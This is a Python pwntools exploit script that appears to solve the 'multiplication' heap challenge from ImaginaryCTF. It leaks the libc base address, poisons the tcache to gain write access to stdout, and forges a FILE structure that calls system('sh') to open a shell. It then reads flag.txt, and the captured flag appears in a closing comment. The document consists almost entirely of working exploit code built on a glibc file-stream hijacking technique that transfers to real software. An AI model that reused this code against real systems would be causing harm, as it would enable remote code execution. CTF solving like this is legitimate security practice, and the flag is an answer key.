#!/usr/bin/env python3

from pwn import *

exe = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(size, data):
	sla(b"> ", b"1")
	sla(b"size: ", f"{size}".encode())
	sla(b"content: ", data)

def edit(idx):
	sla(b"> ", b"3")
	sla(b": ", f"{idx}".encode())

script = '''
# scanf choice
brva 0x153A
'''

while(True):
	try:
		p = remote("multiplication.chal.imaginaryctf.org", 1337)
		#p = process('./vuln_patched')
		#p = gdb.debug('./vuln_patched', gdbscript = script)

		# padding last byte top chunk in libc to 0x00
		create(0xd68, b"B" * 8)

		create(0x100000, b"A" * 8)
		# ptr chunk is now below libc

		# expand stdout write ptr
		edit(0x3085d8)

		p.recv(5)
		libc_base = u64(p.recv(8)) - libc.symbols['_IO_stdfile_1_lock']
		lleak("libc_base", libc_base)

		# aim for last second byte of top chunk in libc
		# pretend that heap base is 0x...?e000
		edit(0x307b10 + 1)

		# malloc 0x290 chunk size (will overlap tcache per thread), fake the tcache point to stdout
		_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
		create(0x200, p16(1) * 0x40 + p64(_IO_2_1_stdout_ - 0x10) * 40)

		# malloc to stdout, fsop
		system = libc_base + libc.symbols['system']
		fp = FileStructure(0)
		fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
		fp._IO_read_end = system
		fp._lock = _IO_2_1_stdout_ + 0x50
		fp._wide_data = _IO_2_1_stdout_ - 0x10
		fp.unknown2 =  p64(0) * 3 + p64(0xffffffff) + p64(0) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
		fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
		payload = bytes(fp)
		create(0x100, b"X" * 0x10 + payload)

		sl(b"echo vanishing")
		rcu(b"vanishing")

		break
	except:
		try:
			p.close()
		except:
			pass


sl(b"cat flag.txt")
#debug()

p.interactive()
#ictf{p0w3r_0f_d0ubl1ng_fr_73e65974ce1f}
